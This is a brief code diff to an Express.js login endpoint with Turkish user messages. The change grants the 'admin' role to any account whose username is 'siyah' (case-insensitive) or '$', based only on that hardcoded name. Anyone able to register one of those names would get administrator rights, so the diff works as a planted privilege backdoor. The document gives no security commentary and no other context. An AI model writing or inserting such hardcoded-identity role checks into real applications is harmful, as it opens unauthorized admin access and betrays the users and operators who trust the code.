@@ -157,7 +157,8 @@ app.post('/api/auth/login', (req, res) => {
     if (!u) return res.status(400).json({ error: "Yanlış giriş bilgileri." });
     if (!u.is_verified) return res.status(403).json({ error: "Hesabın doğrulanmamış. Lütfen e-postanı kontrol ederek hesabını onayla." });
 
-    res.json({ user: { username: u.username, email: u.email, role: 'user' } });
+    const role = (u.username.toLowerCase() === 'siyah' || u.username === '$') ? 'admin' : 'user';
+    res.json({ user: { username: u.username, email: u.email, role: role } });
 });
 
 // 3. DOĞRULAMA (LINK TIKLANDIĞINDA ÇALIŞIR)
